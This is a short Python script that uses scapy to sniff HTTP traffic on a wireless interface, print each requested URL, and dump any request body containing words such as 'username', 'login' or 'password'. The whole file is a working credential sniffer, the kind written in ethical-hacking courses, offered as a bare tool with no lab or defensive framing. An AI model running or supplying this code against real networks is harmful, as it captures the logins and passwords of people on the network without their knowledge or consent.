#!/usr/bin/env python
import scapy.all as scapy
from scapy.layers import http

def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniff_packet)

def get_url(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path

def process_sniff_packet(packet):
    if packet.haslayer(http.HTTPRequest) and packet.haslayer(scapy.Raw):
        load = packet[scapy.Raw].load
        url = get_url(packet)
        print("[+] HTTP Request" + url.decode())
        keywords = ["username", "user", "login", "password", "pass"]
        for keyword in keywords:
            if keyword in str(load):
                print(f"\n\n[+] Possible username/password > {load.decode()}\n\n")
                break

sniff("wlp2s0")